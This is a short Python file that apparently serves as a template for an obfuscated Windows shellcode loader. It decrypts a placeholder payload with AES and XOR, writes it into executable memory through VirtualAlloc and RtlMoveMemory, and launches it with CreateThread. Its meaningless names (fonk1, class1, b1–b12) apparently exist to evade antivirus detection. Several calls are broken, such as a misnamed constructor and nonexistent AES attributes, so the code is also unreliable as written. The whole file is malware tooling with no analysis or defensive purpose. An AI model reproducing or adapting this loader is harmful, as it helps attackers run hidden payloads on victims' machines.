from ctypes import c_int, windll
import ctypes
from ctypes import pointer, c_char
import hashlib
from Crypto.Cipher import AES
from base64 import b64decode
from binascii import unhexlify
from itertools import cycle, izip
def fonk1(ciphertext, b1):
    return ''.join(chr(ord(x) ^ ord(y)) for (x, y) in izip(list(b64decode(ciphertext)), cycle(b1)))
class class1:
    def fonk2(self, b1):
        self.b1 = hashlib.sha256(b1.encode('utf8')).digest()
        self.b2 = AES.b2
    def fonk3(self, ciphertext):
        b3 = b64decode(ciphertext)
        b4 = AES.new(self.b1, AES.MODE_CBC, b3[:self.b2])
        return b4.fonk3(b3[self.b2:]).rstrip(c_char('\x00')).decode()
b5 = '---b5---'
b6 = '---b6---'
b7 = '---b7---'
b8 = class1(b5)
b9 = fonk1(b8.fonk3(b6), b7)
b10 = windll.kernel32.VirtualAlloc(c_int(0), c_int(len(b9)), c_int(0x3000), c_int(0x40))
b11 = (c_char * len(b9)).from_buffer(b9)
windll.kernel32.RtlMoveMemory(c_int(b10), b11, c_int(len(b9)))
b12 = windll.kernel32.CreateThread(c_int(0), c_int(0), c_int(b10), c_int(0), c_int(0), pointer(c_int(0)))
windll.kernel32.WaitForSingleObject(c_int(b12), c_int(-1))